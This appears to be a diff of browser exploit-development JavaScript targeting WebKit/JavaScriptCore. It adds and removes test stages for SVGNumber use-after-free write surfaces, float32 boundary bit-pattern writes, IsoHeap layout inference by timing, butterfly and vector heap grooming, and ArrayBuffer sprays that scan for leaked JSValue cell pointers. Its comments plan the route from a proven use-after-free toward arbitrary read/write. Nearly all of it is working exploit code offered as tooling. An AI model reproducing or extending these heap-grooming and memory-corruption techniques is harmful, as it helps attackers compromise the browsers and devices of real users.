+  for(var i=0;i<fcmRefs.length;i++){
+    var fc=fcmRefs[i];
+    if(!fc)continue;
+    try{
+      var vF=fc.ref.value;
+      if(Math.abs(vF-fc.tag)<0.5){
+        fcmAlive++;
+        // Try write
+        try{
+          fc.ref.value=TAG_FCM+1000+i;
+          var vFw=fc.ref.value;
+          if(Math.abs(vFw-(TAG_FCM+1000+i))<0.5)fcmWritable++;
+        }catch(ew){}
+      }else{
+        fcmDead++;
+      }
+    }catch(et){
+      fcmThrew++;
+    }
+  }
+  log('  TRF1: [PartB] fcm orphans: alive='+fcmAlive+' dead='+fcmDead+' threw='+fcmThrew+' writable='+fcmWritable,'dim');
+  if(fcmWritable===20)log('  TRF1: [PartB] ★ ALL 20 FLOATS WRITABLE after orphan! 80-byte UAF write surface!','win');
+  else if(fcmWritable>0)log('  TRF1: [PartB] ★ '+fcmWritable+' floats writable! UAF write surface partial!','win');
+  else if(fcmAlive>0)log('  TRF1: [PartB] alive but not writable — read-only UAF?','crit');
+
+  R.trf1.hit=tWritable>0||fcmWritable>0;
+  R.trf1.uafMatrix=(typeof tWritable!=='undefined'&&tWritable>0);
+  R.trf1.fields=(typeof tWritable!=='undefined'?tWritable:0)+fcmWritable;
+  R.trf1.detail='svgTransform_writable='+(typeof tWritable!=='undefined'?tWritable:0)+' fcm20_writable='+fcmWritable;
+  log('  TRF1: '+R.trf1.detail,R.trf1.hit?'win':'dim');
+
+  if(!q)dis(false);
+}
+
+/*
+ * FLB1: Float32 range EXACT boundary test
+ *
+ * float32 max = 3.4028234663852886e+38 (FLT_MAX)
+ * WebKit SVGNumber validates: throw "outside range of float" if value > FLT_MAX or < -FLT_MAX
+ *
+ * Questions:
+ * 1. Is the check strict (<) or non-strict (<=)?
+ *    i.e. does writing EXACTLY FLT_MAX succeed or throw?
+ * 2. What is the EXACT cutoff?
+ *    FLT_MAX = 3.4028234663852886e+38
+ *    FLT_MAX + 1 ulp (64-bit) = ? Does it throw?
+ * 3. Are there any exploitable gaps?
+ *    e.g. value > FLT_MAX in f64 but rounds to FLT_MAX in f32 → no throw → stores FLT_MAX bits
+ *
+ * ARM64 float32 FLT_MAX bits: 0x7F7FFFFF
+ * As f64: 3.4028234663852886e+38
+ * The next f64 value up: 3.4028234663852894e+38 (one ULP in f64)
+ *
+ * WebKit source check (approximate):
+ *   if (!std::isfinite(value) || value > std::numeric_limits<float>::max() || value < -std::numeric_limits<float>::max())
+ *     throwDOMException...
+ *
+ * If check uses float comparison: might be subtly different
+ */
+async function runFLB1(q){
+  if(!q){dis(true);sep();log('FLB1: Float32 range exact boundary test','inf');sep();}
+
+  var d=makeFCM();
+  await raf();
+  var ref=d.fcm.values.baseVal[0];
+
+  // FLT_MAX exact
+  var FLT_MAX=3.4028234663852886e+38;
+  // FLT_MAX * (1 + 2^-23) = first value NOT representable as float32
+  // Actually: largest finite float32 = (2 - 2^-23) * 2^127 = 3.4028234663852886e+38
+  // Next float64 value above FLT_MAX:
+  var FLT_MAX_PLUS1=3.4028234663852894e+38; // one float64 ULP above FLT_MAX
+  // Float32 overflow threshold: values above (FLT_MAX + FLT_MAX/2) round to infinity
+  // Actually: next float32 after FLT_MAX would be infinity
+  // The boundary where float64 rounds UP to infinity in float32:
+  // = FLT_MAX + 0.5*ulp(FLT_MAX) = FLT_MAX * (1 + 2^-24)
+  var F32_OVERFLOW=FLT_MAX*(1+Math.pow(2,-24));
+
+  var tests=[
+    {name:'FLT_MAX exactly', val:FLT_MAX},
+    {name:'FLT_MAX + 1f64ulp', val:FLT_MAX_PLUS1},
+    {name:'FLT_MAX * (1+2^-24) [f32 overflow boundary]', val:F32_OVERFLOW},
+    {name:'FLT_MAX * 1.0000001', val:FLT_MAX*1.0000001},
+    {name:'FLT_MAX * 2', val:FLT_MAX*2},
+    {name:'-FLT_MAX exactly', val:-FLT_MAX},
+    {name:'-FLT_MAX - 1f64ulp', val:-FLT_MAX_PLUS1},
+    {name:'-FLT_MAX * (1+2^-24)', val:-F32_OVERFLOW},
+    // Large but sub-MAX values to find exact threshold
+    {name:'3.4e+38', val:3.4e+38},
+    {name:'3.40282e+38', val:3.40282e+38},
+    {name:'3.402823e+38', val:3.402823e+38},
+    {name:'3.4028234e+38', val:3.4028234e+38},
+    {name:'3.40282346e+38', val:3.40282346e+38},
+    {name:'3.402823466e+38', val:3.402823466e+38},
+    {name:'3.4028234663e+38', val:3.4028234663e+38},
+    {name:'3.40282346638e+38', val:3.40282346638e+38},
+    {name:'3.402823466385e+38', val:3.402823466385e+38},
+    {name:'3.4028234663852e+38', val:3.4028234663852e+38},
+    {name:'3.40282346638528e+38', val:3.40282346638528e+38},
+    {name:'3.402823466385288e+38', val:3.402823466385288e+38},
+    {name:'3.4028234663852886e+38', val:3.4028234663852886e+38},
+    {name:'3.4028234663852890e+38', val:3.4028234663852890e+38},
+  ];
+
+  var firstThrow=null,lastOK=null;
+  for(var i=0;i<tests.length;i++){
+    var t=tests[i];
+    try{
+      ref.value=t.val;
+      var rb=ref.value;
+      // What does it actually store?
+      // Compare with expected float32 round:
+      var f32Approx=Math.fround?Math.fround(t.val):t.val;
+      log('  FLB1: [OK] '+t.name+' = '+t.val.toExponential(6)+
+        ' → readback='+rb.toExponential(6)+
+        ' f32approx='+f32Approx.toExponential(6),'ok');
+      lastOK=t;
+    }catch(e){
+      if(!firstThrow)firstThrow=t;
+      log('  FLB1: [THROW] '+t.name+' = '+t.val.toExponential(6)+' → '+e,'bad');
+    }
     await raf();
   }
 
-  // Also test: alloc same buffer MANY TIMES rapidly — does JSC recycle?
-  log('  ZRO1: rapid-recycle test (no GC between alloc+free)...','dim');
-  var prevCanary=false;
-  for(var r=0;r<50;r++){
-    var ab=new ArrayBuffer(160);
-    var u32=new Uint32Array(ab);
-    if(u32[0]===CANARY_HI&&u32[10]===CANARY_LO){
-      prevCanary=true;
-      log('  ZRO1[rapid-160]: ★ RECYCLED with CANARY on round '+r,'win');
-      R.zro1.zeros=false;break;
-    }
-    for(var j=0;j<u32.length;j++)u32[j]=(j%2===0)?CANARY_HI:CANARY_LO;
-    // DON'T force GC — just drop ref immediately
-    u32=null;ab=null;
-  }
-  if(!prevCanary)log('  ZRO1[rapid-160]: all zeros (no recycling or zeroing on recycle)','dim');
+  log('  FLB1: ─────────────────────────','dim');
+  if(lastOK)log('  FLB1: last OK value: '+lastOK.name+' = '+lastOK.val.toExponential(10),'ok');
+  if(firstThrow)log('  FLB1: first THROW value: '+firstThrow.name+' = '+firstThrow.val.toExponential(10),'bad');
 
-  R.zro1.detail='zeros='+R.zro1.zeros;
-  log('  ZRO1: zeroing='+R.zro1.zeros+(R.zro1.zeros?' (fastMalloc zeroes — ALL groom approaches blocked)':' (NO ZEROING — groom feasible!)'),R.zro1.zeros?'dim':'win');
-  if(!q)dis(false);
-}
+  // Also test: can we write special bit patterns via valid float range?
+  // Float32 bit tricks: what bit pattern LOOKS like a JSValue?
+  // JSC cell ptr: 0x00000001_xxxxxxxx as float64
+  // = very small positive float64 ≈ 1.0e-315 range
+  // Those are well within float32 range? NO — they're subnormal float64, not float32 at all
+  // Float32 range: ±1.18e-38 (smallest normal) to ±3.4e+38
+  // 1.0e-315 << float32 min → would be 0 in float32
+  log('  FLB1: --- JSValue bit test ---','dim');
+  // Try writing a value that would store interesting bit patterns in the float32 field
+  // Bit pattern 0x3F800000 = 1.0 in float32
+  // Bit pattern 0x7F7FFFFF = FLT_MAX in float32
+  // What about negative zero?
+  try{ref.value=0;var rb0=ref.value;log('  FLB1: write 0 → readback='+rb0,'dim');}catch(e){}
+  try{ref.value=-0;var rbn0=ref.value;log('  FLB1: write -0 → readback='+rbn0+' (sign: '+1/rbn0+')'+(1/rbn0===-Infinity?' = -0':''),'dim');}catch(e){}
+  // -0 as float32: bit pattern 0x80000000
 
-/*
- * BUT1: JSC butterfly property storage groom — PRIMARY STAGE
- *
- * JSC stores an object's named properties in a "butterfly" — a WTF::fastMalloc
- * allocation. Layout: [out-of-line named props grow LEFT from center][header][indexed props grow RIGHT]
- *
- * Each property slot = 64-bit JSValue:
- *   - If value is a JS cell (object): JSValue = raw pointer to JSObject in MarkedSpace
- *   - If value is int32: NaN-boxed (upper 32 bits = 0xFFFF0000)
- *   - If value is float64: IEEE double
- *
- * PLAN:
- * 1. Create JS object `obj` and set exactly N named properties
- *    - Include SVGNumber JS wrappers as some property values → cell pointers in butterfly!
- * 2. Delete ALL N properties → JSC might free the butterfly to WTF::fastMalloc
- *    - Caveat: JSC uses Structure to track property layout; delete might not immediately free
- * 3. OR: set obj = null + GC → whole object freed including butterfly
- * 4. Immediately spray ArrayBuffer(butterfly_size) → groom freed butterfly slot
- * 5. Read ArrayBuffer → scan for JSValue cell pointers (arm64 pointer shaped)
- *
- * COMPLICATION: deleting properties in JSC creates new "Structures" (property maps)
- * that may or may not result in butterfly reallocation. Full deletion often transitions
- * to a "dictionary mode" that might or might not free the old butterfly.
- *
- * APPROACH A: delete all props → JSC dictionary mode → new butterfly freed?
- * APPROACH B: obj = null + GC → butterfly freed as part of object collection
- *   (can't use this because once we null obj, we don't know what the butterfly contained)
- *
- * For B, we pre-record expected butterfly contents by creating a TWIN object
- * with identical properties and keeping it alive for reference.
- */
-async function runBUT1(q){
-  if(!q){dis(true);sep();log('BUT1: JSC butterfly property storage groom','inf');sep();}
+  // Try very small positive (subnormal float32 territory)
+  var f32min_normal=Math.pow(2,-126); // 1.175e-38
+  var f32min_subnormal=Math.pow(2,-149); // 1.4e-45
+  try{ref.value=f32min_normal;var rbfn=ref.value;log('  FLB1: f32 min normal 2^-126='+f32min_normal.toExponential(3)+' → readback='+rbfn.toExponential(3),'dim');}catch(e){log('  FLB1: f32min_normal threw: '+e,'bad');}
+  try{ref.value=f32min_subnormal;var rbfs=ref.value;log('  FLB1: f32 subnormal 2^-149='+f32min_subnormal.toExponential(3)+' → readback='+rbfs,'dim');}catch(e){log('  FLB1: f32min_subnormal threw: '+e,'bad');}
 
-  var TAG_BUT=1234567.89;
-
-  // Setup: create feColorMatrix and get some live SVGNumber wrappers
-  var d=makeFCM(identity20());
-  await raf();
-  var svgRefs=[];
-  for(var i=0;i<20;i++){try{svgRefs.push(d.fcm.values.baseVal[i]);}catch(e){}}
-  log('  BUT1: got '+svgRefs.length+' live SVGNumber JS wrappers','dim');
-
-  try{
-    // Test butterfly sizes based on property count:
-    // JSC out-of-line butterfly: each slot = 8 bytes (JSValue)
-    // Header = 8 bytes (arrayLength + vectorLength)
-    // N properties → butterfly_size = (N * 8) + 8 bytes minimum
-    // But JSC uses nextPowerOfTwo for capacity, so 20 props → capacity 32 → 32*8+8 = 264 bytes
-
-    var propCounts=[8,16,20,24,32];
-
-    for(var pi=0;pi<propCounts.length;pi++){
-      var NPROPS=propCounts[pi];
-      var butterflySizeEst=NPROPS*8+8; // estimated butterfly backing store size
-
-      // Create object with NPROPS properties
-      // Mix SVGNumber wrappers (cell ptrs) and float values (detectable patterns)
-      var objA={};
-      for(var i=0;i<NPROPS;i++){
-        if(i<svgRefs.length){
-          objA['p'+i]=svgRefs[i]; // cell pointer JSValue
-        }else{
-          objA['p'+i]=TAG_BUT+i; // float JSValue
-        }
-      }
-
-      // Create TWIN object (keep alive as reference)
-      var objB={};
-      for(var i=0;i<NPROPS;i++)objB['p'+i]=objA['p'+i];
-
-      log('  BUT1[N='+NPROPS+']: objects created, butterfly_est='+butterflySizeEst+' bytes','dim');
-
-      // APPROACH A: delete all props on objA
-      // This forces JSC to dictionary mode and potentially frees the old butterfly
-      for(var i=0;i<NPROPS;i++)try{delete objA['p'+i];}catch(e){}
-
-      // Pre-alloc to warm freelist
-      var warm=[];for(var i=0;i<64;i++)warm.push(new ArrayBuffer(butterflySizeEst));
-      warm.splice(0,32);
-
-      // IMMEDIATELY spray ArrayBuffer of estimated butterfly size
-      var spray=[];for(var i=0;i<1024;i++)spray.push(new ArrayBuffer(butterflySizeEst));
-      await raf();
-
-      // Scan spray for JSValue-like patterns
-      var ptrHits=[];var intHits=[];
-      for(var i=0;i<spray.length;i++){
-        var f64=new Float64Array(spray[i]);
-        for(var j=0;j<f64.length;j++){
-          var jsv=looksLikeJSValue(f64[j]);
-          if(jsv.isCell){ptrHits.push({i:i,j:j,hex:jsv.hex});}
-          else if(jsv.isInt){intHits.push({i:i,j:j,hex:jsv.hex});}
-        }
-      }
-      log('  BUT1[N='+NPROPS+']: cell-ptr hits='+ptrHits.length+' int-jsval hits='+intHits.length,'dim');
-      if(ptrHits.length>0){
-        R.but1.hit=true;
-        for(var i=0;i<Math.min(5,ptrHits.length);i++){
-          log('  ★ BUT1: cell ptr: spray['+ptrHits[i].i+']['+ptrHits[i].j+']='+ptrHits[i].hex,'win');
-          R.but1.ptrs.push(ptrHits[i].hex);
-        }
-      }
-
-      warm=null;spray=null;
-      await raf();
-    }
-
-    // APPROACH B: null + GC
-    // Create object, store SVGNumber refs, null the object, GC, spray, scan
-    log('  BUT1: approach B (null + GC)...','dim');
-    var objC={};
-    for(var i=0;i<20;i++){
-      if(i<svgRefs.length)objC['prop'+i]=svgRefs[i];
-      else objC['prop'+i]=TAG_BUT+i;
-    }
-    objC=null; // drop ref
-    forceGC();
-    await raf();
-
-    // Spray multiple sizes since we don't know exact butterfly size
-    var sprayB=[];
-    for(var i=0;i<256;i++){
-      sprayB.push(new ArrayBuffer(160));
-      sprayB.push(new ArrayBuffer(168));
-      sprayB.push(new ArrayBuffer(176));
-      sprayB.push(new ArrayBuffer(264));
-    }
-    await raf();
-
-    var ptrHitsB=0;
-    for(var i=0;i<sprayB.length;i++){
-      var f64=new Float64Array(sprayB[i]);
-      for(var j=0;j<f64.length;j++){
-        var jsv=looksLikeJSValue(f64[j]);
-        if(jsv.isCell){ptrHitsB++;
-          if(ptrHitsB<=3)log('  ★ BUT1-B: cell ptr: buf['+i+']['+j+']='+jsv.hex,'win');
-          R.but1.hit=true;R.but1.ptrs.push(jsv.hex);
-        }
-      }
-    }
-    log('  BUT1-B: cell-ptr hits='+ptrHitsB,'dim');
-    sprayB=null;
-
-  }catch(e){log('  BUT1 EXCEPTION: '+e,'bad');}
+  R.flb1.hit=(firstThrow!==null);
+  R.flb1.boundary=firstThrow?firstThrow.val:null;
+  R.flb1.detail='firstThrow='+(firstThrow?firstThrow.name:'none')+' lastOK='+(lastOK?lastOK.name:'none');
+  log('  FLB1: '+R.flb1.detail,'dim');
 
   cleanupD(d);
-  R.but1.detail='hit='+R.but1.hit+' ptrs='+R.but1.ptrs.length;
-  log('  BUT1: hit='+R.but1.hit+' ptrs_found='+R.but1.ptrs.length,R.but1.hit?'win':'dim');
   if(!q)dis(false);
 }
 
 /*
- * BUT2: Butterfly groom with Object.create(null) + TypedArray JSValues
+ * ILP1: IsoHeap page layout prediction
  *
- * Different object creation path than BUT1 to test JSC's Property map.
- * Use numeric-keyed properties AND named properties to test different butterfly layouts.
+ * IsoHeap<SVGNumber> is bump-only (confirmed by ORF1: 0 collisions in 1000 allocs)
+ * bump-only = MONOTONICALLY INCREASING addresses
+ * Pages: IsoHeap uses 16KB or 32KB pages, each carved into fixed-size slots
  *
- * ALSO: test if Float64Array view itself leaks its backing store address via
- * JSC's internal buffer pointer storage.
+ * Goal: estimate sizeof(SVGNumber) and page size
+ * Method:
+ *   Allocate N SVGNumbers → write encoded addresses into .value fields
+ *   Use bit pattern to INFER relative addresses
+ *
+ * Wait — we can't READ the C++ address directly from .value
+ * But we CAN observe TIMING and ALLOCATION PATTERNS:
+ *
+ * Better method: BINARY SEARCH for page boundary via write-after-free
+ * If two SVGNumbers are in the SAME page:
+ *   sizeof(SVGNumber) spacing between them
+ * If in DIFFERENT pages:
+ *   spacing = (page_end - prev_pos) + page_header + sizeof(SVGNumber)
+ *   = larger gap
+ *
+ * We can't read addresses directly...
+ * BUT: after we've proven UAF (PTR1), we could write specific patterns
+ * and check if those patterns appear in OTHER SVGNumber reads.
+ *
+ * v46 approach: allocate large numbers of SVGNumbers in batches
+ * Measure: allocation speed per batch (timing via performance.now())
+ * A page crossing = new mmap/vm_allocate = measurable latency spike
+ * Find spike → estimate when page crossed → estimate sizeof(SVGNumber) * items_per_page
+ *
+ * Also: try to estimate sizeof(SVGNumber) via feColorMatrix list
+ *   20 SVGNumbers allocated sequentially → are they adjacent?
+ *   If sizeof(SVGNumber)=N, then addresses should be addr0, addr0+N, addr0+2N, ...
+ *   We can probe this by: write to svgNum[0], read from svgNum[1] (if adjacent in memory)
+ *   But we don't have arbitrary R/W yet...
+ *
+ * Practical test: timing-based page boundary detection
  */
-async function runBUT2(q){
-  if(!q){dis(true);sep();log('BUT2: Butterfly groom variant + TypedArray backing ptr test','inf');sep();}
+async function runILP1(q){
+  if(!q){dis(true);sep();log('ILP1: IsoHeap page layout prediction via timing','inf');sep();}
 
-  try{
-    // Test 1: Object.create(null) with various property counts
-    var COUNTS=[8,12,16,24,32,48,64];
-    for(var ci=0;ci<COUNTS.length;ci++){
-      var N=COUNTS[ci];
-      var o=Object.create(null);
-      for(var i=0;i<N;i++)o['k'+i]=Math.PI*i+1.23456789; // distinctive float values
+  // Method: allocate SVGNumbers in large batches, measure per-batch timing
+  // A page allocation (vm_allocate) takes measurably longer than a bump alloc
+  // IsoHeap pages are 16KB. sizeof(SVGNumber) is likely 12-16 bytes (has m_value + vtable ptr + refcount)
+  // Actually bmalloc IsoHeap SVGNumber = 16 bytes? (4 bytes m_value + 4 pad + 8 vtable?)
+  // Wait: SVGNumber is a WTF::RefCounted<SVGNumber> + PropertyRegistry + m_value
+  //   sizeof(SVGPropertyOwner) ~ 8+4 = 12 → aligned to 16?
+  //   Let's assume 16 bytes. 16KB page → 1024 items/page
+  //   Or: 32 bytes per SVGNumber. 16KB page → 512 items/page.
 
-      // Kill the object
-      o=null;forceGC();
+  var BATCH_SIZE=50; // allocate 50 at a time
+  var NUM_BATCHES=100; // total 5000 SVGNumbers
+  var timings=[];
+  var allSVGs=[];
+  var allFCMs=[];
 
-      // Spray 256 × (N*8+16) sized buffers (estimated butterfly size)
-      var est=N*8+16;
-      var s=[];for(var i=0;i<256;i++)s.push(new ArrayBuffer(est));
-      await raf();
+  log('  ILP1: allocating SVGNumbers in batches of '+BATCH_SIZE+', '+NUM_BATCHES+' batches','dim');
 
-      var hits=0;
-      for(var i=0;i<s.length;i++){
-        var f64=new Float64Array(s[i]);
-        for(var j=0;j<f64.length;j++){
-          // Look for our Math.PI * i + 1.23456789 pattern
-          // Pi*0+1.234... = 1.234... (won't look like ptr)
-          // Just look for pointer-shaped values
-          if(looksLikeJSValue(f64[j]).isCell){hits++;
-            if(hits<=2)log('  BUT2[N='+N+']: cell hit: '+f64bits(f64[j]).hex,'win');
-            R.but2.hit=true;R.but2.ptrs.push(f64bits(f64[j]).hex);
-          }
-        }
-      }
-      log('  BUT2[N='+N+']: cell hits='+hits,'dim');
-      s=null;
+  for(var b=0;b<NUM_BATCHES;b++){
+    var t0=performance.now();
+    var dN=makeFCM(null,'ilp_'+b);
+    var blN=dN.fcm.values.baseVal;
+    // Get all 20 refs
+    var batchRefs=[];
+    for(var i=0;i<20&&i<blN.length;i++){
+      try{batchRefs.push(blN[i]);}catch(e){}
     }
-
-    // Test 2: TypedArray view leak — does the ArrayBuffer retain a pointer to its
-    // own backing store or to JSC internals that we can observe via Float64 read?
-    log('  BUT2: TypedArray self-pointer test...','dim');
-    var ab=new ArrayBuffer(256);
-    var f64=new Float64Array(ab);
-    // Read all 32 slots looking for pointer-shaped values (JSC might store ptrs in the header region)
-    var selfPtrs=[];
-    for(var i=0;i<f64.length;i++){if(looksLikePtr(f64[i]))selfPtrs.push({i:i,hex:f64bits(f64[i]).hex});}
-    if(selfPtrs.length>0){
-      log('  BUT2: ★ TypedArray has pointer-shaped data at creation! slots: '+selfPtrs.length,'win');
-      for(var i=0;i<Math.min(3,selfPtrs.length);i++)log('    ['+selfPtrs[i].i+']='+selfPtrs[i].hex,'win');
-      R.but2.hit=true;
-    }else{
-      log('  BUT2: TypedArray is clean (zeroed) at creation','dim');
-    }
-
-    // Test 3: Rapid property addition → deletion cycle
-    // Create object with 32 props, delete half, add 32 more (different names), delete all
-    // Each resize step might create/free butterfly versions
-    var obj={};
-    for(var i=0;i<32;i++)obj['a'+i]=1000+i; // first 32 props
-    for(var i=0;i<16;i++)delete obj['a'+i]; // delete first 16
-    for(var i=0;i<32;i++)obj['b'+i]=2000+i; // add 32 more props (different names)
-    for(var i=16;i<32;i++)delete obj['a'+i]; // delete remaining 16 a-props
-    for(var i=0;i<32;i++)delete obj['b'+i]; // delete all 32 b-props
-    obj=null;forceGC();
-
-    var sprayC=[];for(var i=0;i<512;i++){sprayC.push(new ArrayBuffer(256));sprayC.push(new ArrayBuffer(512));}
-    await raf();
-    var cycleHits=0;
-    for(var i=0;i<sprayC.length;i++){
-      var f64b=new Float64Array(sprayC[i]);
-      for(var j=0;j<f64b.length;j++){
-        if(looksLikeJSValue(f64b[j]).isCell){cycleHits++;
-          if(cycleHits<=2)log('  BUT2-cycle: cell hit: '+f64bits(f64b[j]).hex,'win');
-          R.but2.hit=true;
-        }
-      }
-    }
-    log('  BUT2-cycle: cell hits='+cycleHits,'dim');
-    sprayC=null;
-
-  }catch(e){log('  BUT2 EXCEPTION: '+e,'bad');}
-
-  R.but2.detail='hit='+R.but2.hit+' ptrs='+R.but2.ptrs.length;
-  log('  BUT2: hit='+R.but2.hit,R.but2.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * RPI1: SVGNumberList.replaceItem() primitive test
- *
- * SVGNumberList has replaceItem(newItem, index) which replaces item at index.
- * We can create standalone SVGNumbers via svg.createSVGNumber().
- *
- * Tests:
- * 1. Can we call createSVGNumber() on an SVGSVGElement?
- * 2. Does replaceItem() release the old SVGNumber (reduce its ref count)?
- * 3. If yes: does the old SVGNumber go to IsoHeap freelist?
- * 4. Build large freelist via replaceItem() loop, THEN check bump position
- */
-async function runRPI1(q){
-  if(!q){dis(true);sep();log('RPI1: SVGNumberList.replaceItem() primitive','inf');sep();}
-
-  var TAG_RPI=9876543.0;
-
-  var svgSVG=document.createElementNS(SVG_NS,'svg');
-  svgSVG.setAttribute('width','1');svgSVG.setAttribute('height','1');
-  svgSVG.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-  document.body.appendChild(svgSVG);
-
-  var d=makeFCM(identity20());
-  await raf();
-
-  try{
-    // Test 1: createSVGNumber availability
-    var canCreate=false;var testNum=null;
-    try{testNum=svgSVG.createSVGNumber();canCreate=true;log('  RPI1: createSVGNumber() available!','ok');}
-    catch(e2){log('  RPI1: createSVGNumber threw: '+e2,'inf');}
-    if(!canCreate){
-      log('  RPI1: trying DOMParser SVG fallback...','dim');
-      // Try via DOMParser
+    // Also alloc via replaceItem to get more
+    var svgSVGn=dN.svg;
+    for(var i=0;i<BATCH_SIZE-20;i++){
       try{
-        var dp=new DOMParser();
-        var svgDoc=dp.parseFromString('<svg xmlns="http://www.w3.org/2000/svg"></svg>','image/svg+xml');
-        testNum=svgDoc.documentElement.createSVGNumber();
-        canCreate=true;
-        log('  RPI1: createSVGNumber() via DOMParser!','ok');
-      }catch(e3){log('  RPI1: DOMParser approach also threw: '+e3,'inf');}
-    }
-
-    if(canCreate&&testNum!=null){
-      log('  RPI1: testNum.value='+testNum.value,'dim');
-      testNum.value=TAG_RPI;
-      log('  RPI1: after set, testNum.value='+testNum.value,'dim');
-
-      // Test 2: replaceItem()
-      var bl=d.fcm.values.baseVal;
-      var oldRef=bl[0];log('  RPI1: oldRef[0].value='+oldRef.value,'dim');
-      try{
-        var replacedOld=bl.replaceItem(testNum,0);
-        log('  RPI1: replaceItem(testNum,0) succeeded!','ok');
-        log('  RPI1: returned old item value='+replacedOld.value+' (expect 1.0 = identity)','dim');
-        log('  RPI1: list[0] after replace='+bl[0].value+' (expect '+TAG_RPI+')','dim');
-        log('  RPI1: oldRef.value after replace='+oldRef.value+' (still live?)','dim');
-        R.rpi1.hit=true;
-      }catch(e2){log('  RPI1: replaceItem threw: '+e2,'inf');}
-
-      // Test 3: replaceItem in loop — build freelist of released SVGNumbers
-      // Each replaceItem() releases one SVGNumber from the list (if ref count drops)
-      // After N replacements, check if the OLD SVGNumbers are still accessible
-      var NREP=100;var oldRefs2=[];
-      log('  RPI1: running '+NREP+' replaceItem() calls to build potential freelist...','dim');
-      try{
-        for(var i=0;i<NREP;i++){
-          var newN=svgSVG.createSVGNumber();newN.value=TAG_RPI+i;
-          var prev=bl.replaceItem(newN,0); // each call releases previous item at [0]
-          oldRefs2.push({ref:prev,expectedVal:prev?prev.value:null});
-        }
-        log('  RPI1: completed '+NREP+' replacements. oldRefs2.length='+oldRefs2.length,'dim');
-        // Check if old refs are still alive
-        var liveCount=0;var corruptCount=0;
-        for(var i=0;i<oldRefs2.length;i++){
-          try{
-            var v=oldRefs2[i].ref.value;
-            if(Math.abs(v-(TAG_RPI+i-1))<0.01)liveCount++;
-            else corruptCount++;
-          }catch(e2){corruptCount++;}
-        }
-        log('  RPI1: old refs still live='+liveCount+' corrupted='+corruptCount,'dim');
-      }catch(e2){log('  RPI1: loop threw: '+e2,'inf');}
-    }else{
-      log('  RPI1: createSVGNumber not available — cannot run RPI1','dim');
-    }
-
-  }catch(e){log('  RPI1 EXCEPTION: '+e,'bad');}
-
-  svgSVG.parentNode&&svgSVG.parentNode.removeChild(svgSVG);
-  cleanupD(d);
-  R.rpi1.detail='hit='+R.rpi1.hit;
-  log('  RPI1: hit='+R.rpi1.hit,R.rpi1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * FRC1: feConvolveMatrix kernelMatrix — FIXED (v44 used wrong attr 'kernel' not 'kernelMatrix')
- *
- * Correct attributes:
- * - kernelSize or 'order' (separate x,y or single N for N×N)
- * - kernelMatrix = space-separated list of N*N values
- *
- * Test if kernelMatrix IS accessible and IS a live SVGAnimatedNumberList.
- * If yes → repeat VEC3 with correct implementation + surgical spray.
- */
-async function runFRC1(q){
-  if(!q){dis(true);sep();log('FRC1: feConvolveMatrix kernelMatrix FIXED test','inf');sep();}
-
-  var svgNS=SVG_NS;
-  var svgEl=document.createElementNS(svgNS,'svg');
-  svgEl.setAttribute('width','2');svgEl.setAttribute('height','2');
-  svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-  var defs=document.createElementNS(svgNS,'defs');
-  var filt=document.createElementNS(svgNS,'filter');filt.setAttribute('id','frc1filt');
-
-  var fcv=document.createElementNS(svgNS,'feConvolveMatrix');
-  // FIXED: use 'order' instead of 'kernelSize'
-  fcv.setAttribute('order','3 3');
-  var k9=[1,0,0,0,1,0,0,0,1];
-  // FIXED: use 'kernelMatrix' not 'kernel'
-  fcv.setAttribute('kernelMatrix',k9.join(' '));
-  fcv.setAttribute('divisor','1');
-
-  filt.appendChild(fcv);defs.appendChild(filt);svgEl.appendChild(defs);
-  document.body.appendChild(svgEl);
-  await raf();
-
-  try{
-    var km=fcv.kernelMatrix;
-    log('  FRC1: kernelMatrix obj='+km,'dim');
-    var bv=km&&km.baseVal;
-    var len=bv?(bv.numberOfItems!==undefined?bv.numberOfItems:bv.length):'n/a';
-    log('  FRC1: kernelMatrix.baseVal.length='+len+' (expect 9 for 3×3)','dim');
-
-    if(bv&&len>0){
-      log('  FRC1: ✅ kernelMatrix accessible! length='+len,'ok');
-      R.frc1.hit=true;
-
-      // Read current values
-      var vals=[];
-      for(var i=0;i<len;i++)try{vals.push(bv[i]?bv[i].value:'err');}catch(e2){vals.push('err');}
-      log('  FRC1: kernelMatrix values='+vals.join(','),'dim');
-
-      // Test growing: change to 5×5 (25 values) → old 3×3 vector (72 bytes) freed
-      var k25=[];for(var i=0;i<25;i++)k25.push(i+1);
-      fcv.setAttribute('order','5 5');
-      fcv.setAttribute('kernelMatrix',k25.join(' '));
-      await raf();
-      var len25=bv?(bv.numberOfItems!==undefined?bv.numberOfItems:bv.length):'n/a';
-      log('  FRC1: after 5×5 change, length='+len25+' (expect 25)','dim');
-
-      if(len25==25){
-        // The vector grew! old 9-element (72-byte) vector might be freed
-        // Surgical spray: alloc exactly ONE ArrayBuffer(72) to try to grab freed slot
-        var surg=new ArrayBuffer(72);
-        var surg_f64=new Float64Array(surg);
-        var surg_hits=0;
-        for(var i=0;i<surg_f64.length;i++){
-          if(looksLikePtr(surg_f64[i])){surg_hits++;
-            log('  FRC1: ★ SURGICAL HIT: ['+i+']='+f64bits(surg_f64[i]).hex,'win');
-          }
-        }
-        if(surg_hits===0)log('  FRC1: surgical single-alloc: 0 pointer hits (zeroing or missed timing)','dim');
-        surg=null;surg_f64=null;
-
-        // Wider spray
-        var spray=[];for(var i=0;i<2048;i++)spray.push(new ArrayBuffer(72));
-        await raf();
-        var wide_hits=0;
-        for(var i=0;i<spray.length;i++){
-          var f64=new Float64Array(spray[i]);
-          for(var j=0;j<f64.length;j++){if(looksLikePtr(f64[j])){wide_hits++;}}
-        }
-        log('  FRC1: wide spray (2048×72): ptr hits='+wide_hits,wide_hits>0?'win':'dim');
-        spray=null;
-
-        // Shrink back: 5×5→3×3 → old 25-element (200-byte) vector freed
-        fcv.setAttribute('order','3 3');
-        fcv.setAttribute('kernelMatrix',k9.join(' '));
-        await raf();
-        var sprayB=[];for(var i=0;i<1024;i++)sprayB.push(new ArrayBuffer(200));
-        var wideB_hits=0;
-        for(var i=0;i<sprayB.length;i++){
-          var f64=new Float64Array(sprayB[i]);
-          for(var j=0;j<f64.length;j++){if(looksLikePtr(f64[j])){wideB_hits++;}}
-        }
-        log('  FRC1: wide spray (1024×200): ptr hits='+wideB_hits,wideB_hits>0?'win':'dim');
-        sprayB=null;
-      }
-    }else{
